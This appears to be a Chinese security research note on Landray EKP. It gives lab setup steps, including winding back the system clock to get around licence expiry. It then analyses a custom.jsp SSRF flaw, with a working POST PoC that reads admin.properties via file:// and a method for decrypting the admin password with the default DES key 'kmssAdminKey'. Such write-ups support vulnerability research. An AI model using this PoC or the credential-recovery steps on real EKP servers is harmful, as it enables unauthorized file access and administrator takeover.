# 蓝凌EKP

## 环境安装
*   （1）安装mysql、sql server等数据库之一，创建一个名为ekp的数据库，字符集设置为UTF-8
*   （2）获取安装文件：linux64.zip，ekp.zip，将二者解压放在同一目录下，例如`C:\Users\Administrator\Desktop\v15\`下
*   （3）windows下要求安装有jdk7，并配置`JAVA_HOME`环境变量
*   （4）修改系统时间至2021-04-26之前（根据自身Landray的授权截止时间更改）
*   （5）复制ekp文件夹中`web-safe.xml`的内容到`web.xml`。（直接覆盖）
*   （6）切到目录的`\linux64\tomcat\bin`，命令行中执行`.\catalina.bat run`启动服务器
*   （7）服务成功启动后访问，http://ip:8080/ekp/admin.do，此时页面密码为`Password1`（这个密码位于`/ekp/WEB-INF/KmssConfig/admin.properties`）
*   （8）根据前面配置的数据库，更改数据库连接url（将服务器地址landray.com.cn换成本机的，如127.0.0.1），测试数据库连接。另外，可修改附件存放地址，默认为`C:\landray\kmss\resource`。修改完页面配置后，点击保存，会要求重启服务器
*   （9）重启服务器之前，复制ekp文件夹中的`web-normal.xml`到`web.xml`（此处需要注意，更改了第五步中的web.xml，否则启动失败）。然后再执行`.\catalina.bat run`启动服务器
*   （10）重启成功后，访问`http://ip:8080/ekp/sys/profile/index.jsp`，登陆的默认用户名密码为：`admin 1`，然后系统会要求更改`1`这个过于简单的密码
*   （11）访问`http://ip:8080/ekp/sys/profile/index.jsp`进入蓝凌后台，然后选择`运维管理-管理员工具箱-系统初始化`，进行系统初始化操作
*   （12）如果想要调试蓝凌EKP的代码，可以在服务器启动时采用命令`.\catalina.bat jpda start`启动服务器，这样默认的监听端口为8000

## 路由分析

## 已知漏洞
 - [1.custom.jsp文件读取漏洞](#custom文件读取)
 - [2.admin.do jndi漏洞](#jndi攻击admin)

### custom文件读取
custom.jsp文件内容如下
```jsp
<%@page import="com.landray.kmss.util.ResourceUtil"%>
<%@page import="net.sf.json.JSONArray"%>
<%@page import="net.sf.json.JSONObject"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%
	JSONObject vara = JSONObject.fromObject(request.getParameter("var"));
	JSONObject body = JSONObject.fromObject(vara.get("body"));
	if(body.containsKey("file")){
%>
<c:import url='<%=body.getString("file") %>' charEncoding="UTF-8">
	<c:param name="var" value="${ param['var'] }"></c:param>
</c:import>
<% }%>
```
其中的两个jsp标签`<c:import>`和`<c:param>`。`<c:import>`用于请求本地或远程数据/文件，其中必须要传入url参数，url可以是相对路径和绝对路径。`<c:param>`用于指定url的参数

也就是标签部分存在两个值，一个是url，另外一个是加参数后的url。如果传入的url和param如下，那么加参数后的url为`http://a.com?id=test`，会向这个url发起请求，造成SSRF。
```
<c:import url="http://a.com" > 
<c:param name="id" value="test" /> 
</c:import>
```

然后看一下poc，访问路径就是jsp文件在ekp文件夹下的绝对路径，POST的内容需要符合JSON格式，赋值给参数var。通过SSRF利用file协议来读取文件
```
POST /ekp/sys/ui/extend/varkind/custom.jsp
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#"}}
```
这样poc经过jsp，url和url加上var参数的值分别如下。也这是为什么url后需要一个`#`来截断（Windows下），以正常读取url对应的文件，否则会报错file not found。
```
url=file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#

urlWithParams=file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#?var={"body":{"file":"file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#"}}
```
读取admin.properties文件，内容如下，其中password是DES加密的
```
password = Ac6OXgTtn4AqNRCxWmSwhg==\r
kmss.properties.encrypt.enabled = true
```
通过在线DES解密网站：http://tool.chacuo.net/cryptdes, 在密码处填入默认密钥`kmssAdminKey`，和待解密的文本`Ac6OXgTtn4AqNRCxWmSwhg==`，进行DES解密后得到
```
Password1
```

### jndi攻击admin